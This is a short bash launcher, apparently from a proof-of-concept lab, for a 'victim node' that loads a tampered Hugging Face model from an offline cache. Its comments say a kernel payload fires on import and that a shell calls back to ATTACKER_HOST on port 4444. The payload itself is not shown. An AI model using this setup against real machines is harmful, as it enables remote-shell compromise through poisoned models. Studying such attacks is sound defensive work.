#!/usr/bin/env bash
# Victim node: load the tampered model offline; the kernel payload fires on import.
set -euo pipefail
REPO="$(cd "$(dirname "$0")" && pwd)"
export HF_HOME="$REPO/.hfcache"
export HF_HUB_OFFLINE=1          # resolve model + kernel from the local cache only
export ATTACKER_HOST="${ATTACKER_HOST:-127.0.0.1}"
echo "[*] Victim running offline; shell will call back to $ATTACKER_HOST:4444"
exec python3 "$REPO/victim_test.py"
